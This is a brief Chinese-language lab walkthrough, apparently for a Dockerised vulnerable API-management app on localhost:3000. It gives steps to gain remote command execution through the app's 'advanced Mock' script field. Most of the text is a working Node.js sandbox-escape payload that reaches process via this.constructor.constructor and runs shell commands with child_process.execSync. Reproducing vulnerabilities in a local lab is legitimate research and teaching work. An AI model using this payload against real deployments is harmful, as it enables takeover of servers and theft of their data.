开启环境：
```
docker compose up -d
```
访问网页：
```
http://localhost:3000
```
注册一个用户并且创建项目和接口

在高级Mock有个脚本选项，填入恶意代码：
```
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("id;uname -a;pwd").toString()
```
保存后访问Mock地址即可执行id命令
